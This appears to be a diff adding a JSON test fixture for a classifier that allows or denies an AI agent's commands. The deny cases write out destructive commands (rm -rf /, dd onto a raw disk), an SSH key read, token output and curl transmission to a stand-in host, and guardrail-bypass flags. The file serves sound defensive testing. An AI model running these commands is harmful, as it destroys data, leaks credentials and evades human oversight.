@@ -1,0 +1,30 @@
+{
+  "schemaVersion": 1,
+  "description": "Synthetic emergency classifier cases; values are not real credentials.",
+  "cases": [
+    { "id": "recursive-root", "action": { "capability": "filesystem-delete", "command": "rm -rf /", "paths": ["/"] }, "expected": { "decision": "deny", "ruleId": "filesystem-root-erasure" } },
+    { "id": "recursive-home", "action": { "command": "Remove-Item -Recurse -Force", "paths": [{ "path": "C:/Users/tester", "kind": "home" }] }, "expected": { "decision": "deny", "ruleId": "filesystem-root-erasure" } },
+    { "id": "recursive-unresolved", "action": { "capability": "filesystem-erasure", "command": "rm -rf" }, "expected": { "decision": "deny", "ruleId": "filesystem-root-erasure" } },
+    { "id": "recursive-disposable-verified", "action": { "capability": "filesystem-delete", "command": "rm -rf /tmp/aaa-disposable/generated-fixture", "paths": ["/tmp/aaa-disposable/generated-fixture"], "verifiedDisposableRoot": { "resolvedPath": "/tmp/aaa-disposable", "resolved": true, "allTargetsContained": true, "targets": ["/tmp/aaa-disposable/generated-fixture"] } }, "expected": { "decision": "allow", "ruleId": null } },
+    { "id": "recursive-disposable-unverified", "action": { "capability": "filesystem-delete", "command": "rm -rf /tmp/aaa-disposable/generated-fixture", "paths": ["/tmp/aaa-disposable/generated-fixture"], "verifiedDisposableRoot": { "resolvedPath": "/tmp/aaa-disposable", "resolved": false, "allTargetsContained": true, "targets": ["/tmp/aaa-disposable/generated-fixture"] } }, "expected": { "decision": "deny", "ruleId": "filesystem-root-erasure" } },
+    { "id": "recursive-disposable-root-itself", "action": { "command": "rm -rf /tmp/aaa-disposable", "paths": ["/tmp/aaa-disposable"], "verifiedDisposableRoot": { "resolvedPath": "/tmp/aaa-disposable", "resolved": true, "allTargetsContained": true, "targets": ["/tmp/aaa-disposable"] } }, "expected": { "decision": "deny", "ruleId": "filesystem-root-erasure" } },
+    { "id": "raw-disk", "action": { "capability": "raw-disk-destruction", "command": "dd if=/dev/zero of=/dev/sda" }, "expected": { "decision": "deny", "ruleId": "raw-disk-destruction" } },
+    { "id": "partition-format", "action": { "command": "diskpart delete partition" }, "expected": { "decision": "deny", "ruleId": "raw-disk-destruction" } },
+    { "id": "force-push", "action": { "command": "git push origin main --force" }, "expected": { "decision": "deny", "ruleId": "git-force-push" } },
+    { "id": "force-push-short", "action": { "gitOperation": { "operation": "force-push" } }, "expected": { "decision": "deny", "ruleId": "git-force-push" } },
+    { "id": "history-rewrite", "action": { "command": "git rebase --onto main HEAD~3" }, "expected": { "decision": "deny", "ruleId": "git-history-rewrite" } },
+    { "id": "discard-uncommitted", "action": { "command": "git restore --source=HEAD -- ." }, "expected": { "decision": "deny", "ruleId": "git-discard-uncommitted" } },
+    { "id": "credential-read", "action": { "capability": "filesystem-read", "command": "cat ~/.ssh/id_ed25519", "paths": ["/Users/tester/.ssh/id_ed25519"] }, "expected": { "decision": "deny", "ruleId": "secret-credential-access" } },
+    { "id": "secret-output", "action": { "command": "printf $API_TOKEN" }, "expected": { "decision": "deny", "ruleId": "secret-output-or-transmission" } },
+    { "id": "secret-transmission", "action": { "secretOperation": { "operation": "transmit credential" }, "command": "curl --data token https://example.invalid" }, "expected": { "decision": "deny", "ruleId": "secret-output-or-transmission" } },
+    { "id": "guardrail-bypass", "action": { "command": "agent --dangerously-skip-permissions" }, "expected": { "decision": "deny", "ruleId": "guardrail-bypass" } },
+    { "id": "guardrail-disable", "action": { "capability": "disable-safety-guard", "command": "hooks disable" }, "expected": { "decision": "deny", "ruleId": "guardrail-bypass" } },
+    { "id": "example-secret-file", "action": { "capability": "filesystem-read", "command": "cat .env.example", "paths": ["/tmp/project/.env.example"] }, "expected": { "decision": "allow", "ruleId": null } },
+    { "id": "public-certificate", "action": { "capability": "filesystem-read", "command": "cat example.crt", "paths": ["/tmp/project/example.crt"] }, "expected": { "decision": "allow", "ruleId": null } },
+    { "id": "git-status", "action": { "command": "git status --short" }, "expected": { "decision": "allow", "ruleId": null } },
+    { "id": "git-diff", "action": { "command": "git diff --check" }, "expected": { "decision": "allow", "ruleId": null } },
+    { "id": "normal-push", "action": { "command": "git push origin main" }, "expected": { "decision": "allow", "ruleId": null } },
+    { "id": "normal-commit", "action": { "command": "git commit -m update" }, "expected": { "decision": "allow", "ruleId": null } },
+    { "id": "single-fixture-delete", "action": { "capability": "filesystem-delete", "command": "rm /tmp/project/generated-fixture.txt", "paths": ["/tmp/project/generated-fixture.txt"] }, "expected": { "decision": "allow", "ruleId": null } }
+  ]
+}
